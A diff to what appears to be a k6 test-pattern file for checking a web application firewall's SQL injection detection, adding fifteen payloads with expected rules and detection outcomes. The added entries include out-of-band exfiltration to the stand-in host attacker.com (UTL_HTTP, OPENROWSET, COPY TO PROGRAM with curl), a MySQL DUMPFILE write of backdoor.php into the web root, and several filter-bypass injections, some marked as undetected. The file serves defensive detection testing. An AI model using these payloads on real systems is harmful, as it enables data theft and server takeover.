@@ -1,7 +1,7 @@
 {
   "metadata": {
     "category": "sqli",
-    "total_patterns": 109,
+    "total_patterns": 124,
     "port": 8001,
     "description": "k6 test patterns for sqli"
   },
@@ -1313,6 +1313,186 @@
       "expected_detection": true,
       "severity": "high",
       "expected_rule": "[NGINX SQLi] Advanced SQL Injection Attempt"
+    },
+    {
+      "id": "SQLI_OOB_001",
+      "name": "Oracle UTL_HTTP OOB Exfiltration",
+      "category": "sqli",
+      "subcategory": "out_of_band",
+      "payload": "' AND UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual))--",
+      "encoded": "'%20AND%20UTL_HTTP.REQUEST('http%3A%2F%2Fattacker.com%2F'%7C%7C(SELECT%20user%20FROM%20dual))--",
+      "port": 8001,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "[NGINX SQLi] Error-based SQL Injection"
+    },
+    {
+      "id": "SQLI_OOB_002",
+      "name": "MSSQL OpenRowset Data Exfil",
+      "category": "sqli",
+      "subcategory": "out_of_band",
+      "payload": "'; SELECT * FROM OPENROWSET('SQLOLEDB','attacker.com';'sa';'pwd','SELECT 1')--",
+      "encoded": "'%3B%20SELECT%20*%20FROM%20OPENROWSET('SQLOLEDB'%2C'attacker.com'%3B'sa'%3B'pwd'%2C'SELECT%201')--",
+      "port": 8001,
+      "expected_detection": false,
+      "severity": "critical",
+      "expected_rule": ""
+    },
+    {
+      "id": "SQLI_OOB_003",
+      "name": "PostgreSQL COPY TO PROGRAM",
+      "category": "sqli",
+      "subcategory": "out_of_band",
+      "payload": "'; COPY (SELECT version()) TO PROGRAM 'curl http://attacker.com'--",
+      "encoded": "'%3B%20COPY%20(SELECT%20version())%20TO%20PROGRAM%20'curl%20http%3A%2F%2Fattacker.com'--",
+      "port": 8001,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "[NGINX SQLi] Boolean-based Blind SQL Injection"
+    },
+    {
+      "id": "SQLI_DUMP_001",
+      "name": "MySQL INTO DUMPFILE Binary Write",
+      "category": "sqli",
+      "subcategory": "file_write",
+      "payload": "' UNION SELECT 0x3C3F706870 INTO DUMPFILE '/var/www/html/backdoor.php'--",
+      "encoded": "'%20UNION%20SELECT%200x3C3F706870%20INTO%20DUMPFILE%20'%2Fvar%2Fwww%2Fhtml%2Fbackdoor.php'--",
+      "port": 8001,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "[NGINX SQLi] Error-based SQL Injection"
+    },
+    {
+      "id": "SQLI_TIME_ADV_001",
+      "name": "MySQL SLEEP with Random Delay",
+      "category": "sqli",
+      "subcategory": "time_based_advanced",
+      "payload": "' AND SLEEP(RAND()*5)--",
+      "encoded": "'%20AND%20SLEEP(RAND()*5)--",
+      "port": 8001,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "[NGINX SQLi] Time-based Blind SQL Injection"
+    },
+    {
+      "id": "SQLI_TIME_ADV_002",
+      "name": "IF SLEEP Conditional",
+      "category": "sqli",
+      "subcategory": "time_based_advanced",
+      "payload": "' AND IF(1=1,SLEEP(5),0)--",
+      "encoded": "'%20AND%20IF(1%3D1%2CSLEEP(5)%2C0)--",
+      "port": 8001,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "[NGINX SQLi] Time-based Blind SQL Injection"
+    },
+    {
+      "id": "SQLI_BIT_001",
+      "name": "Bitwise OR Boolean Bypass",
+      "category": "sqli",
+      "subcategory": "bitwise_injection",
+      "payload": "' AND 1|1--",
+      "encoded": "'%20AND%201%7C1--",
+      "port": 8001,
+      "expected_detection": false,
+      "severity": "high",
+      "expected_rule": ""
+    },
+    {
+      "id": "SQLI_HEX_001",
+      "name": "Hex Encoded UNION SELECT",
+      "category": "sqli",
+      "subcategory": "hex_bypass",
+      "payload": "0x27554e494f4e2053454c454354",
+      "encoded": "0x27554e494f4e2053454c454354",
+      "port": 8001,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "[NGINX SQLi] Advanced SQL Injection Attempt"
+    },
+    {
+      "id": "SQLI_COMM_ADV_001",
+      "name": "Multi-line Comment UNION Bypass",
+      "category": "sqli",
+      "subcategory": "comment_bypass",
+      "payload": "'/**/UNION/**/ALL/**/SELECT/**/NULL,version(),NULL--",
+      "encoded": "'%2F**%2FUNION%2F**%2FALL%2F**%2FSELECT%2F**%2FNULL%2Cversion()%2CNULL--",
+      "port": 8001,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "[NGINX SQLi] Boolean-based Blind SQL Injection"
+    },
+    {
+      "id": "SQLI_CASE_001",
+      "name": "Random Case UNION Injection",
+      "category": "sqli",
+      "subcategory": "case_bypass",
+      "payload": "'uNiOn SeLeCt NuLl,VeRsIoN(),NuLl--",
+      "encoded": "'uNiOn%20SeLeCt%20NuLl%2CVeRsIoN()%2CNuLl--",
+      "port": 8001,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "[NGINX SQLi] Encoded SQL Injection Pattern"
+    },
+    {
+      "id": "SQLI_JSON_001",
+      "name": "JSON Path Injection",
+      "category": "sqli",
+      "subcategory": "json_injection",
+      "payload": "' AND JSON_EXTRACT('{\"a\":1}','$.a')=1--",
+      "encoded": "'%20AND%20JSON_EXTRACT('%7B%22a%22%3A1%7D'%2C'%24.a')%3D1--",
+      "port": 8001,
+      "expected_detection": false,
+      "severity": "high",
+      "expected_rule": ""
+    },
+    {
+      "id": "SQLI_XML_001",
+      "name": "Oracle XMLTYPE Injection",
+      "category": "sqli",
+      "subcategory": "xml_injection",
+      "payload": "' AND EXTRACTVALUE(XMLTYPE('<a>'||(SELECT user FROM dual)||'</a>'),'/a')='test'--",
+      "encoded": "'%20AND%20EXTRACTVALUE(XMLTYPE('%3Ca%3E'%7C%7C(SELECT%20user%20FROM%20dual)%7C%7C'%3C%2Fa%3E')%2C'%2Fa')%3D'test'--",
+      "port": 8001,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "[NGINX SQLi] Error-based SQL Injection"
+    },
+    {
+      "id": "SQLI_ORDER_001",
+      "name": "ORDER BY Subquery Injection",
+      "category": "sqli",
+      "subcategory": "order_by_injection",
+      "payload": "1 ORDER BY (SELECT 1 FROM information_schema.tables)--",
+      "encoded": "1%20ORDER%20BY%20(SELECT%201%20FROM%20information_schema.tables)--",
+      "port": 8001,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "[NGINX SQLi] Boolean-based Blind SQL Injection"
+    },
+    {
+      "id": "SQLI_HAVING_001",
+      "name": "HAVING Clause Injection",
+      "category": "sqli",
+      "subcategory": "having_injection",
+      "payload": "' HAVING 1=1--",
+      "encoded": "'%20HAVING%201%3D1--",
+      "port": 8001,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "[NGINX SQLi] Advanced SQL Injection Attempt"
+    },
+    {
+      "id": "SQLI_GROUPBY_001",
+      "name": "GROUP BY Subquery Injection",
+      "category": "sqli",
+      "subcategory": "group_by_injection",
+      "payload": "' GROUP BY (SELECT table_name FROM information_schema.tables LIMIT 1)--",
+      "encoded": "'%20GROUP%20BY%20(SELECT%20table_name%20FROM%20information_schema.tables%20LIMIT%201)--",
+      "port": 8001,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "[NGINX SQLi] Boolean-based Blind SQL Injection"
     }
   ]
 }
